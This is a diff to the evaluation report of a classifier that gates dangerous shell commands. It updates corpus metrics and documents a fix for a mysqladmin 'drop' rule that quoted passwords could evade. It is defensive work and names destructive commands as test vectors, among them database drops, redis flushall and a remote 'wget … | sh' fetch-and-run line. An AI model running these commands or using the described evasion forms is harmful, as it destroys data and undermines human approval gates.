@@ -46,7 +46,7 @@ from `apps/sidecar/src/normalize.ts` — with no mocks.
   the strict leak gate over the rest of the tree stays hole-free.
 
 Corpus size: **38 redaction positives** across **29 kind families**, **28 hard negatives**, and
-**89 classifier command vectors** (including shell-escape, multi-call binary, Git global-option,
+**91 classifier command vectors** (including shell-escape, multi-call binary, Git global-option,
 Git shell-alias, dynamic-executable, redirect-placement adversarial forms, and one shape from each
 classifier audit round since the sixth — remote-runner substitution, heredoc bodies, compound
 statements, quoted assignments, ANSI-C and `$$` quoting, unterminated heredocs, command-word
@@ -159,13 +159,13 @@ the tool input (not from the command string alone) and are **out of scope** for 
 | recursive-rm      | 25      | 100.0%    | 100.0%     |
 | disk-destroy      | 4       | 80.0%     | 100.0%     |
 | history-rewrite   | 8       | 100.0%    | 100.0%     |
-| db-drop           | 9       | 75.0%     | 100.0%     |
+| db-drop           | 11      | 78.6%     | 100.0%     |
 | fork-bomb         | 1       | 100.0%    | 100.0%     |
 | perm-change       | 5       | 100.0%    | 100.0%     |
 | inline-code       | 13      | 100.0%    | 100.0%     |
 | migrate-prod      | 2       | 50.0%     | 100.0%     |
 | high-risk-other   | 1       | 11.1%     | 100.0%     |
-| **micro-average** | 68      | **82.9%** | **100.0%** |
+| **micro-average** | 70      | **83.3%** | **100.0%** |
 
 **Recall is 100% on every category** — nothing dangerous in the corpus slips past the classifier.
 Read that as a statement about _this corpus_, not a general guarantee: the corpus is only as good as
@@ -195,10 +195,10 @@ than over-gating (an extra approval prompt)**, so ambiguous cases fail toward "g
 
 | Policy                              | Precision | Recall | TP / FP / FN / TN |
 | ----------------------------------- | --------- | ------ | ----------------- |
-| default-gated (out-of-box)          | 93.1%     | 100.0% | 54 / 4 / 0 / 31   |
-| strict-all (every category enabled) | 91.0%     | 100.0% | 61 / 6 / 0 / 22   |
+| default-gated (out-of-box)          | 93.3%     | 100.0% | 56 / 4 / 0 / 31   |
+| strict-all (every category enabled) | 91.3%     | 100.0% | 63 / 6 / 0 / 22   |
 
-- Risk-level exact-match accuracy: **91.0%**.
+- Risk-level exact-match accuracy: **91.2%**.
 - Danger recall (vectors labelled non-`low` that the classifier flags non-`low`): **100.0%**.
   (Before 2026-08-28 this was 98.2%: `DROP DATABASE` was the one dangerous vector the risk verdict
   rated `low`; it is now `high`, see the calibration notes.)
@@ -266,17 +266,41 @@ seven while calling itself complete):
   of pymongo / sqlalchemy-utils joins the same literal for symmetry (its usual `python -c` carrier
   was already `medium` / `inline-code`, so that form was carded before — it now also names the
   category). The corpus carries one vector per form plus two negatives: `mysqladmin status` (a true
-  negative — the rule needs a `drop` word within 512 characters with no `|` `;` `&` or newline
-  between; that boundary is quote-unaware, so `-p'a;b'` or a backslash line continuation hides the
-  subcommand, tracked for v0.9; the longest gap this corpus exercises is 20 characters, so the 512
-  bound itself is pinned by unit tests — a 319-character-gap real invocation and the 512/513 boundary —
-  rather than by these numbers) and `grep -rn flushall src/` (a benign carrier of the bare-token
+  negative — the rule needs a `drop` word within 512 characters of `mysqladmin` inside the same shell
+  command; the corpus also carries a long-option invocation whose gap is 319 characters, and the 512
+  bound's two-sided boundary — 512 matches, 513 does not, in both scan scopes — is pinned by unit
+  tests rather than by these numbers) and `grep -rn flushall src/` (a benign carrier of the bare-token
   redis literal, the same keyword false-positive class as `man dropdb`, measured on purpose). The
   bare-token reach is wider than that search example: `node -e "cache.flushAll()"` (the
   node-cache method name), a path such as `/var/lib/flushall`, or piping logs through
   `grep flushdb` all rate `high` / `db-drop` now. Not covered on purpose: Mongo's
   `db.collection.drop()` — a `.drop(` literal collides with pandas and friends — and MySQL's
   `DROP DATABASE`, which the existing SQL literal already catches.
+- **Closed (2026-08-29, task 01a0480f-d29a):** the `mysqladmin … drop` rule expressed "no separator
+  between the program and the subcommand" with its own hand-written character class
+  (`[^|;&\n]`) instead of the quote-aware splitter the rest of the classifier shares. Because that
+  class cannot see quoting, a metacharacter inside a quoted or escaped argument ended the run —
+  and MySQL _requires_ quoting a password that contains shell metacharacters, so real invocations
+  such as `mysqladmin -u root -p'a;b' --force drop appdb`, `--password='x;y'`, `-p"p&q"`, a
+  backslash line continuation, and forms whose redirect operator contains `&` (`-f &> out.log drop
+appdb`, `2>&1 > out.log drop appdb`) all rated `low` with no category in every mode. The rule now
+  also scans the canonical `splitSegments` output segment by segment, where a quoted or escaped
+  metacharacter is not a separator; a real separator still ends the run, so the negatives
+  (`mysqladmin status | grep drop`, `; echo drop`, a newline, `&& echo drop`) are unchanged. The
+  original whole-command scan is kept alongside it as a non-weakening backstop: the splitter
+  _removes_ redirect operators and their target words, so a segment-only rule would have dropped
+  `mysqladmin status > drop.log` from `high` to `low` — that form still rates `high`, exactly as
+  before. On input the splitter cannot parse at all (an unterminated quote or heredoc) it falls back
+  to the coarse split plus the whole command, so a quoted separator inside an unterminated quote
+  still ends up gated — fail-closed, the same direction the classifier takes everywhere else on
+  unparseable input. What the test suite pins about the change: no verdict in this corpus changed;
+  the previously documented limitations are now `high` / `db-drop` in `INV-DB-DROP-RISK-VERDICT`; and
+  none of the vectors in those pinned lists narrows. The general claim that nothing narrows rests on
+  the audit record, not on the suite: an audit sweep (not part of the suite; recorded in decision
+  01a04955) moved 105 of 219 generated separator / quoting / escape / redirect vectors and narrowed
+  none, and the security lane's independent sweep of 1,140 vectors (decision 01a04973) found no
+  verdict lower than on main. The corpus
+  gains the quoted-password form and a long-option invocation.
 - `find /var/tmp -type f -exec rm {} ;` classifies as `medium` rather than `high`; it is still
   gated (`recursive-rm`).
 - `ssh host 'wget -qO- https://x.example/y | sh'` classifies as `medium` (`inline-code`) where the
